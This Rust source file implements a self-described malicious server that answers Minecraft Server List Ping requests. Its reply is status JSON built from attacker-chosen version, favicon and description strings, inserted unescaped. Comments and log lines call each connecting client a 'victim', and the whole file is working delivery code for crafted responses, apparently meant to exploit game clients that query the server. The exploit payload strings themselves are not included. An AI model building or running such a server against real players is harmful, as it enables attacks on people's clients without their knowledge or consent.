use std::error::Error;
use std::io::Cursor;

use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::{TcpListener, TcpStream},
};

/// Malicious server
pub struct Server {
    host: String,
    port: u16,
    description: String,
    favicon: String,
    version: String,
}

impl Server {
    pub fn new(host: &str, port: u16, description: &str, favicon: &str, version: &str) -> Self {
        Self {
            host: String::from(host),
            port,
            description: String::from(description),
            favicon: String::from(favicon),
            version: String::from(version),
        }
    }

    /// Convert an integer to varint bytes
    async fn to_varint(&self, int: usize) -> Result<Vec<u8>, Box<dyn Error>> {
        let mut int = (int as u64) & 0xFFFF_FFFF;
        let mut written = 0;
        let mut buffer = [0; 5];

        loop {
            let temp = (int & 0b0111_1111) as u8;
            int >>= 7;
            if int != 0 {
                buffer[written] = temp | 0b1000_0000;
            } else {
                buffer[written] = temp;
            }
            written += 1;
            if int == 0 {
                break;
            }
        }

        Ok(buffer[0..written].to_vec())
    }

    /// Read a varint value from a TcpStream
    async fn read_varint_from_socket(
        &mut self,
        stream: &mut TcpStream,
    ) -> Result<usize, Box<dyn std::error::Error>> {
        let mut read = 0;
        let mut output = 0;

        loop {
            let read_value = stream.read_u8().await?;

            let value = read_value & 0b0111_1111;

            output |= (value as usize) << (7 * read);

            read += 1;

            if read > 5 {
                panic!(); // varint size should be 5
            }

            if (read_value & 0b1000_0000) == 0 {
                return Ok(output);
            }
        }
    }

    /// Handle new victim
    async fn handle(&mut self, stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
        let mut buffer = vec![0; self.read_varint_from_socket(stream).await?];

        stream.read_exact(&mut buffer).await?;

        // Any SLP request packet should start with 0x00 and end with 0x1
        if (buffer.first().unwrap(), buffer.last().unwrap()) != (&0x0, &0x1) {
            println!("[-] Received packet was apparently not a SLP packet.");
            return Ok(());
        }

        let payload = format!("{{\"version\": {{\"name\": \"{}\", \"protocol\": 47}}, \"players\": {{\"max\": 1, \"online\": 0}}, \"favicon\": \"{}\", \"description\": {{\"text\": \"{}\"}}}}", self.version, self.favicon, self.description);

        let mut packet = Cursor::new(Vec::<u8>::new());

        // Packet ID (0x00)
        packet
            .write_all(self.to_varint(0).await?.as_slice())
            .await?;

        // Payload length
        packet
            .write_all(self.to_varint(payload.len()).await?.as_slice())
            .await?;

        // Payload
        packet.write_all(payload.as_bytes()).await?;

        println!("[~] Sending packet...");

        // Packet length
        stream
            .write_all(self.to_varint(packet.get_ref().len()).await?.as_slice())
            .await?;

        // Packet
        stream.write_all(packet.get_ref()).await?;

        println!("[+] Response packet written.");

        Ok(())
    }

    /// Run the server
    pub async fn run(&mut self) -> Result<(), Box<dyn Error>> {
        let addr = format!("{}:{}", self.host, self.port);
        let listener = TcpListener::bind(&addr).await?;

        println!("[~] Server is listening on `{}`...", addr);

        loop {
            match listener.accept().await {
                Ok((mut stream, address)) => {
                    println!("[+] Handling new client: `{}`", address);
                    self.handle(&mut stream).await?
                }
                Err(e) => panic!("[-] Failed to handle client: `{}`", e),
            }
        }
    }
}
